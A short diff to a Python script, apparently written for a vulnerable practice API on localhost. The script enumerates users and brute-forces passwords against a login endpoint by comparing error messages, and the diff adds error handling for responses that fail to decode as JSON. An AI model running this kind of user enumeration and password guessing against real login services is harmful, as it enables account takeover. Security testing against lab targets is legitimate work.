@@ -34,10 +34,15 @@ def enumerate_users():
                 "password": password
             }
             response = requests.post("http://localhost:5000/users/v1/login", json=data)
-            body = response.json()
-            if body["message"] == password_error_message:
+            try:
+                body = response.json()
+            except ValueError:
+                print(f"Failed to decode JSON for user {user} with password {password}. Response content: {response.text}")
+                continue
+
+            if body.get("message") == password_error_message:
                 print(f"User {user} does exist, checking passwords")
-            elif body["message"] == "Successfully logged in.":
+            elif body.get("message") == "Successfully logged in.":
                 print(f"Found {user} with password {password}")
             else:
                 break
@@ -50,7 +55,9 @@ if __name__ == "__main__":
 
     response = check_credentials(vuln, request_data, user)
     if response:
-        print(response.get_json())  # Or handle the response appropriately
+        try:
+            print(response.get_json())  # Or handle the response appropriately
+        except Exception as e:
+            print(f"Failed to decode response JSON: {str(e)}")
     else:
         enumerate_users()
-
